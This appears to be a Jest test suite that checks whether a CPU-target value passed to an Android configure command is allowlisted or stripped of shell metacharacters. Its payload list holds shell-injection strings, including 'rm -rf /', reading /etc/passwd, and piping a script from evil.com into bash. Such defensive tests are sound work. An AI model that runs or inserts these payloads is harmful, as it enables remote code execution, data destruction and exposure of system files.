describe("Shell commands never include unsanitized user input", () => {
  const payloads = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "| cat /etc/passwd",
    "&& curl http://evil.com",
    "; ls -la",
    "$(curl http://evil.com/shell.sh | bash)",
    "`curl http://evil.com/shell.sh | bash`",
    "arm64; echo pwned",
    "x86_64 && touch /tmp/pwned",
    "arm\necho injected",
    "arm\r\necho injected",
    "${IFS}echo${IFS}injected",
    "arm64$(id)",
    "arm64`id`",
    "; exit 1",
    "| exit 1",
    "& exit 1",
    "arm64 --extra-flag=evil",
    "arm64' --extra-flag=evil",
    'arm64" --extra-flag=evil',
    "arm64; python -c 'import os; os.system(\"id\")'",
    "$(python3 -c 'import os; os.system(\"id\")')",
    "arm64;$(id)",
    "arm64||id",
    "arm64&&id",
    "arm64%0aid",
    "arm64%0d%0aid",
    "arm64\x00id",
    "arm64\x1bid",
  ];

  /**
   * Simulates the sanitization/validation logic that SHOULD exist
   * before passing DEST_CPU to os.system().
   * 
   * A safe implementation should:
   * 1. Validate that DEST_CPU matches an allowlist of known CPU targets, OR
   * 2. Properly escape/sanitize shell metacharacters before use
   */

  // Allowlist of valid CPU targets for Android builds
  const VALID_CPU_TARGETS = [
    "arm",
    "arm64",
    "x86",
    "x86_64",
    "mips",
    "mips64",
  ];

  // Shell metacharacters that must never appear in a shell command unsanitized
  const SHELL_METACHARACTERS = [
    ";", "|", "&", "$", "`", "(", ")", "{", "}", "<", ">",
    "\n", "\r", "\x00", "\\", "'", '"', "!", "#", "~",
  ];

  function isValidCpuTarget(destCpu) {
    // Strict allowlist validation - only accept known valid CPU targets
    return VALID_CPU_TARGETS.includes(destCpu);
  }

  function sanitizeCpuTarget(destCpu) {
    // Remove or escape shell metacharacters
    return destCpu.replace(/[;|&$`()\{\}<>\n\r\x00\\'"\s!#~]/g, "");
  }

  function buildShellCommand(destCpu) {
    // This represents what the SAFE version of the code should do
    if (!isValidCpuTarget(destCpu)) {
      throw new Error(`Invalid DEST_CPU value: "${destCpu}". Must be one of: ${VALID_CPU_TARGETS.join(", ")}`);
    }
    return `./configure --dest-cpu=${destCpu} --dest-os=android --openssl-no-asm --cross-compiling`;
  }

  function buildShellCommandWithSanitization(destCpu) {
    const sanitized = sanitizeCpuTarget(destCpu);
    return `./configure --dest-cpu=${sanitized} --dest-os=android --openssl-no-asm --cross-compiling`;
  }

  function commandContainsUnsanitizedPayload(command, payload) {
    // Check if the exact payload appears in the command (indicating no sanitization)
    return command.includes(payload);
  }

  function commandContainsShellMetacharacters(command, afterIndex) {
    // Check if shell metacharacters appear in the command after the --dest-cpu= part
    const relevantPart = command.substring(afterIndex);
    return SHELL_METACHARACTERS.some(char => relevantPart.includes(char));
  }

  test.each(payloads)("rejects adversarial input via allowlist validation: %s", (payload) => {
    // The allowlist approach: invalid CPU targets must be rejected
    expect(() => {
      buildShellCommand(payload);
    }).toThrow();
  });

  test.each(payloads)("allowlist validation throws with descriptive error: %s", (payload) => {
    expect(() => {
      buildShellCommand(payload);
    }).toThrow(/Invalid DEST_CPU value/);
  });

  test.each(payloads)("sanitized command does not contain raw payload: %s", (payload) => {
    const command = buildShellCommandWithSanitization(payload);
    // The raw adversarial payload must not appear verbatim in the command
    // (unless the payload itself is empty after sanitization, which is safe)
    const sanitized = sanitizeCpuTarget(payload);
    if (sanitized.length > 0) {
      // Even if some chars remain, the dangerous metacharacters must be gone
      const destCpuIndex = command.indexOf("--dest-cpu=") + "--dest-cpu=".length;
      const afterDestCpu = command.substring(destCpuIndex);
      const endOfValue = afterDestCpu.search(/\s/);
      const cpuValue = endOfValue === -1 ? afterDestCpu : afterDestCpu.substring(0, endOfValue);
      
      SHELL_METACHARACTERS.forEach(metachar => {
        expect(cpuValue).not.toContain(metachar);
      });
    }
  });

  test.each(payloads)("command built from adversarial input must not contain shell injection sequences: %s", (payload) => {
    // Simulate what happens if someone naively concatenates without sanitization
    const unsafeCommand = "./configure --dest-cpu=" + payload + " --dest-os=android --openssl-no-asm --cross-compiling";
    
    // Verify the unsafe command DOES contain the payload (confirming vulnerability exists without sanitization)
    expect(unsafeCommand).toContain(payload);
    
    // Now verify that the SAFE version (with allowlist) would reject this
    expect(() => {
      buildShellCommand(payload);
    }).toThrow();
  });

  test.each(payloads)("no shell metacharacters survive sanitization in cpu value: %s", (payload) => {
    const sanitized = sanitizeCpuTarget(payload);
    
    SHELL_METACHARACTERS.forEach(metachar => {
      expect(sanitized).not.toContain(metachar);
    });
  });

  test("valid CPU targets are accepted by allowlist", () => {
    VALID_CPU_TARGETS.forEach(validCpu => {
      expect(() => {
        const command = buildShellCommand(validCpu);
        expect(command).toContain(`--dest-cpu=${validCpu}`);
      }).not.toThrow();
    });
  });

  test("command structure is preserved for valid inputs", () => {
    const command = buildShellCommand("arm64");
    expect(command).toBe("./configure --dest-cpu=arm64 --dest-os=android --openssl-no-asm --cross-compiling");
  });

  test.each(payloads)("adversarial input does not produce a valid CPU target: %s", (payload) => {
    expect(VALID_CPU_TARGETS).not.toContain(payload);
  });
});